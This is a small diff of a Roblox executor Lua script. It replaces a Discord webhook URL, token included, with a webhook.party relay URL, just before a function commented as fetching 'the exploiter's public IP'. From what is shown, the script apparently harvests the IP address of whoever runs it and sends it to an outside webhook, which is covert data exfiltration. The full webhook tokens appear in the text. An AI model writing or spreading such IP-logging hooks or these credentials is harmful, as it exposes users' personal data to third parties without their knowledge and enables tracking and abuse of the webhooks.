@@ -6,7 +6,7 @@ local PLAYERS = game:GetService("Players")
 
 assert(HTTP, "This executor does not expose an HTTP function!")
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1387040549978243184/PCC26FfXNOgM1gvJCboghVlouj6SQZ7kvz8k8KP--z-eEjY_deqWE7MWYmgjCJD0hmf3"
+local WEBHOOK_URL = "https://l.webhook.party/hook/VEt1IR5JDz304EvhfmIUADSH7%2BXhYgCKiAPXtnaeQ4iuujNVMkI2ny4WvVA%2FZXj4SIPTK9EkGYfnYNla1pPev92o%2BVZ6yiJGDJQis5rbkdGF3mrb27%2BplfDsMKJCDEtt8aODrj6NG5Y3vfYzBCW8hTSJXMumU0VJEbUvAI%2BE900RtP3mHB8yZzUeVp191MxvmGDtea6YlY4tbzDjjaY%2F2v%2Fo8F2%2B%2Fq5OPyUZ2zwY0lQRiVnvsA9THBOn57%2F2%2FvKhjUk24gnCLY3v%2Fk3OTgQUw79zXPm7XKNIUJrEIQPgKQhBeduXBkLzaXiShcNeFn%2BrG6R%2BALlSy4uo%2B23KtLC8%2Ba%2FefCFizRVuJ8fTd2tijl37X5SRRfLilKFagckiPO0rRWHNplMc2Qk%3D/2uaQTJyBB09Lvcd9"
 
 -- Fetch the exploiter’s public IP
 local function fetchIP()
